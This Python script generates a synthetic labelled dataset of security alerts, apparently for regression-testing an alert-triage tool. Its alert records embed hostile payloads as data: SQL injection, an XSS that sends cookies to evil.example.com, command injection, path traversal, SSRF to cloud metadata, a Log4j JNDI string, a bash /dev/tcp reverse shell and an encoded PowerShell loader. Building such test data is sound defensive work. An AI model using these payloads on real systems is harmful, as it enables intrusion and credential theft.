"""生成带人工标签的合成评估集。

为什么要造数据：真实护网告警涉及客户数据，不能放进公开仓库。
这里按攻击类型 + 噪声类型构造样本，标签由"这条告警到底该不该处置"决定，
跑出来的指标只用于版本间回归对比，不能当成真实世界的准确率。

用法：python scripts/gen_dataset.py
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 42
TZ = timezone(timedelta(hours=8))
START = datetime(2026, 9, 10, 9, 0, 0, tzinfo=TZ)

PUBLIC_IPS = [
    "45.134.26.17",
    "91.240.118.5",
    "185.220.101.4",
    "103.145.13.9",
    "80.94.95.7",
    "141.98.10.6",
    "194.26.135.12",
    "62.204.41.99",
]
INTERNAL_IPS = ["10.20.3.8", "10.20.4.12", "10.30.1.5", "10.40.2.7"]
ASSETS = ["order-api", "pay-api", "oa-portal", "wiki"]

rng = random.Random(SEED)
_samples: list[dict] = []
_clock = START


def _tick(seconds: int = 37) -> str:
    global _clock
    _clock += timedelta(seconds=seconds)
    return _clock.isoformat()


def _base(**kwargs) -> dict:
    alert = {
        "alert_type": "Web Attack",
        "timestamp": _tick(),
        "src_ip": rng.choice(PUBLIC_IPS),
        "dst_ip": rng.choice(INTERNAL_IPS),
        "dst_port": 443,
        "target_url": "/",
        "http_method": "GET",
        "status_code": 200,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "payload": None,
        "raw_log": None,
        "asset": rng.choice(ASSETS),
        "action": "logged",
    }
    alert.update(kwargs)
    return alert


def add(alert: dict, label: str, category: str, reason: str) -> None:
    alert["_label"] = label
    alert["_category"] = category
    alert["_label_reason"] = reason
    _samples.append(alert)


# ---------------------------------------------------------------- 真实攻击
def synthetic_attacks() -> None:
    for _ in range(14):
        add(
            _base(
                alert_type="SQL Injection",
                target_url="/api/v1/order/detail?id=1%20union%20select%201,2,3--",
                payload="1 union select username,password from users--",
                status_code=500,
                user_agent=rng.choice(["sqlmap/1.7.2#stable", "Mozilla/5.0"]),
            ),
            "true_positive",
            "sqli",
            "外部 IP 携带 union select 载荷，返回 500，典型注入利用",
        )
    for _ in range(10):
        add(
            _base(
                alert_type="SQL Injection",
                target_url="/login?user=admin'--&pwd=x",
                payload="admin' or 1=1--",
                status_code=200,
            ),
            "true_positive",
            "sqli",
            "永真式绕过登录判断",
        )
    for _ in range(6):
        add(
            _base(
                alert_type="SQL Injection",
                target_url="/api/report?id=1",
                payload="1' AND (SELECT 5 FROM (SELECT(SLEEP(5)))abc)--",
                status_code=200,
            ),
            "true_positive",
            "sqli",
            "时间盲注，响应被拖慢",
        )
    for _ in range(12):
        add(
            _base(
                alert_type="XSS",
                target_url="/comment/submit",
                http_method="POST",
                payload='{"content":"<script>fetch(\'//evil.example.com/\'+document.cookie)</script>"}',
                status_code=200,
            ),
            "true_positive",
            "xss",
            "评论接口未过滤脚本，回显到页面",
        )
    for _ in range(9):
        add(
            _base(
                alert_type="Command Injection",
                target_url="/tools/ping?host=127.0.0.1;id",
                payload="127.0.0.1;whoami",
                status_code=200,
            ),
            "true_positive",
            "cmdi",
            "ping 工具拼接 shell 命令",
        )
    for _ in range(8):
        add(
            _base(
                alert_type="Path Traversal",
                target_url="/download?file=../../../../etc/passwd",
                status_code=200,
            ),
            "true_positive",
            "traversal",
            "读取系统敏感文件",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="LFI",
                target_url="/index.php?page=php://filter/convert.base64-encode/resource=config",
                status_code=200,
            ),
            "true_positive",
            "lfi",
            "伪协议读取源码",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="SSRF",
                target_url="/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/",
                status_code=200,
                asset="pay-api",
            ),
            "true_positive",
            "ssrf",
            "尝试读取云主机元数据获取临时凭证",
        )
    for _ in range(4):
        add(
            _base(
                alert_type="Log4j Exploit",
                target_url="/api/search",
                user_agent="${jndi:ldap://45.134.26.17:1389/Exploit}",
                status_code=200,
            ),
            "true_positive",
            "log4j",
            "JNDI 注入尝试",
        )
    for _ in range(6):
        add(
            _base(
                alert_type="WebShell",
                target_url="/upload/2026/09/av.php?cmd=whoami",
                status_code=200,
            ),
            "true_positive",
            "webshell",
            "上传目录出现可执行脚本并带 cmd 参数",
        )

    # SSH 暴力破解：同一 IP 连打，制造突发
    brute_ip = "185.220.101.4"
    for index in range(18):
        add(
            _base(
                alert_type="SSH Brute Force",
                timestamp=_tick(23),
                src_ip=brute_ip,
                dst_ip="10.20.4.12",
                dst_port=22,
                target_url=None,
                http_method=None,
                status_code=None,
                user_agent=None,
                raw_log=f"Failed password for root from {brute_ip} port {40000 + index} ssh2",
                asset="pay-api",
                action="logged",
            ),
            "true_positive",
            "ssh_brute",
            "同一 IP 连续认证失败",
        )

    for _ in range(4):
        add(
            _base(
                alert_type="Reverse Shell",
                dst_port=443,
                raw_log="bash -i >& /dev/tcp/45.134.26.17/4444 0>&1",
                asset="oa-portal",
            ),
            "true_positive",
            "revshell",
            "主机侧检测到反弹 shell 命令",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="Suspicious Process",
                raw_log="powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA",
                asset="oa-portal",
            ),
            "true_positive",
            "ps_encoded",
            "编码命令 + 隐藏窗口，典型加载器",
        )
    for _ in range(3):
        add(
            _base(
                alert_type="Cryptomining",
                raw_log="stratum+tcp://pool.minexmr.com:4444 xmrig --donate-level 1",
                asset="wiki",
            ),
            "true_positive",
            "miner",
            "挖矿程序外连矿池",
        )

    # 规则未覆盖的真实攻击：考的是"该不该自动关闭"，
    # 正确行为是交给人（needs_review），而不是判误报
    for index in range(6):
        add(
            _base(
                alert_type="Suspicious Outbound",
                target_url=None,
                raw_log=f"dns query TXT {index}x9f2a7c1e5b3d8f4a6c2e.chunk-{index}.tunnel.example.cn",
                asset="wiki",
            ),
            "true_positive",
            "evasion_dns",
            "DNS 隧道外带数据，规则库暂未覆盖",
        )


# ---------------------------------------------------------------- 误报
def synthetic_false_positives() -> None:
    for _ in range(15):
        add(
            _base(
                alert_type="HTTP 200",
                src_ip=f"10.0.0.{rng.randint(20, 40)}",
                target_url="/health",
                user_agent="Uptime-Kuma/1.23.13",
                asset="order-api",
            ),
            "false_positive",
            "health_check",
            "内部拨测的健康检查，无攻击特征",
        )
    for _ in range(12):
        add(
            _base(
                alert_type="Directory Scan",
                target_url="/admin.php",
                status_code=404,
                user_agent="Nikto/2.5.0",
                action="blocked",
            ),
            "false_positive",
            "scanner_noise",
            "公网扫描器盲扫，已被 WAF 拦截且 404",
        )
    for _ in range(10):
        add(
            _base(
                alert_type="Directory Scan",
                target_url="/wp-login.php",
                status_code=404,
                user_agent="Googlebot/2.1 (+http://www.google.com/bot.html)",
            ),
            "false_positive",
            "crawler",
            "搜索引擎爬虫访问历史路径",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="SQL Injection",
                target_url="/search?q=union%20select%20tutorial",
                payload="union select tutorial",
                status_code=200,
            ),
            "false_positive",
            "hard_noise",
            "用户在搜索框输入教程关键词，属于难例误报",
        )


# ---------------------------------------------------------------- 待复核
def synthetic_needs_review() -> None:
    for _ in range(6):
        add(
            _base(
                alert_type="XSS",
                target_url="/profile?name=%3Cscript%3E",
                status_code=403,
                action="blocked",
            ),
            "needs_review",
            "xss_blocked",
            "payload 形态像 XSS 但被拦截，未见成功迹象",
        )
    for _ in range(6):
        add(
            _base(
                alert_type="Path Traversal",
                target_url="/static?path=../report.pdf",
                status_code=200,
            ),
            "needs_review",
            "traversal_soft",
            "出现单次穿越序列但无敏感文件特征，需人工确认",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="Login Failure",
                target_url="/login",
                http_method="POST",
                status_code=401,
                action="allowed",
            ),
            "needs_review",
            "login_fail",
            "少量登录失败，不足以定性为撞库",
        )
    for _ in range(5):
        add(
            _base(
                alert_type="Suspicious DNS Query",
                target_url=None,
                raw_log="query dga-c2-candidate.example.cn A 10.20.3.8",
                asset="order-api",
            ),
            "needs_review",
            "unknown",
            "未知类型告警，规则未覆盖",
        )
    for index in range(4):
        add(
            _base(
                alert_type="API Abuse",
                target_url=f"/api/item?id={index}",
                status_code=200,
                user_agent="python-requests/2.31",
            ),
            "false_positive",
            "api_single_call",
            "单次脚本调用业务接口，无攻击特征",
        )


def main() -> None:
    synthetic_attacks()
    synthetic_false_positives()
    synthetic_needs_review()
    rng.shuffle(_samples)

    root = Path(__file__).resolve().parent.parent
    labeled = root / "data" / "samples" / "labeled.jsonl"
    labeled.parent.mkdir(parents=True, exist_ok=True)
    labeled.write_text(
        "\n".join(json.dumps(s, ensure_ascii=False) for s in _samples) + "\n",
        encoding="utf-8",
    )

    # 去掉标签的纯告警集，用于 demo 和接口测试
    alerts = root / "data" / "samples" / "alerts.jsonl"
    alerts.write_text(
        "\n".join(
            json.dumps({k: v for k, v in s.items() if not k.startswith("_")}, ensure_ascii=False)
            for s in _samples
        )
        + "\n",
        encoding="utf-8",
    )

    from collections import Counter

    counts = Counter(s["_label"] for s in _samples)
    print(f"生成 {len(_samples)} 条样本 -> {labeled}")
    print(f"标签分布: {dict(counts)}")


if __name__ == "__main__":
    main()
